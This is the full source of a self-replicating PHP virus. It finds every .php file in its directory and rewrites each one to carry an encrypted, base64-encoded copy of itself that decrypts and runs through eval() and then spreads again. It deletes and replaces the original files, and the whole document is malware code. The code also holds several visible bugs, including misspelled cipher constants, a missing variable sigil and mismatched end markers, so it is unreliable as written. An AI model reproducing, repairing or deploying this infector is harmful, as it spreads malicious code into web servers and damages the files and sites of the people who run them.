<?php
//VIRUS:START
function execute($virus){
  $filenames = glob('*.php');
  foreach($filenames as $filename){
    $script = fopen($filename, "r");
    //check if not $infected
    $first_line = fgets($script);
    $virus_hash = md5($filename);
    if (strpos($first_line, $virus_hash) == false){
      //write to new file as opposed to reading the script into RAM == less issues with bigger files
      $infected = fopen("$filename.infected", "w");
      // to prevent this file encrypting itself
      $chechsum = '<php // Checksum: ' . $virus_hash . ' ?>';
      $infection = '<?php' . encryptedVirus($virus) . '?>';
      fputs($infected, $chechsum,strlen($chechsum));
      fputs($infected, $infection,strlen($infection));
      fputs($infected, $first_line,strlen($first_line));

    while($contents = fgets($script)){
      fputs($infected, $contents, strlen($contents));
    }
    fclose($script);
    fclose($infected);
    unlink("$filename");
    rename("$filename.infected", $filename);
    }
  }
}

function encryptedVirus($virus){
  //Key gen
  $str = '0123456789abcdef';
  $key = '';
  for($i=0;$i<64;++$i) $key.=$str[rand(0,strlen($str)-1)];
  $key = pack('H*', $key);
  //Encrypt
  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJDAEL_128, MCRYPT_MODE_CBC);
  $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
  $encryptedVirus = mcrypt_encrypt(
    MCRYPT_RIJDAEL_128,
    $key,
    $virus,
    MCRYPT_MODE_CBC,
    $iv
  );

  $encodedVirus = base64_encode(encryptedVirus);
  $encodedIV = base64_encode($iv);
  $encodedKey = base64_encode($key);

  $payload = "
  \$encryptedVirus = '$encodedVirus';
  \$iv = '$encodedIV';
  \$key = '$encodedKey';
  \$virus = mcrypt_decrypt(
    MCRYPT_RIJDAEL_128,
    base64_decode(\$key),
    base64_decode(\$encodedVirus),
    MCRYPT_MODE_CBC,
    base64_decode(\$iv)
  );

  eval(\$virus);
  execute(\$virus);
  ";
  return $payload;
}
// double underscore PHP notation for full path of file currently running
$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "//VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n//VIRUS:END") + strlen("\n//Virus : END"));
execute($virus);

//VIRUS:END
?>
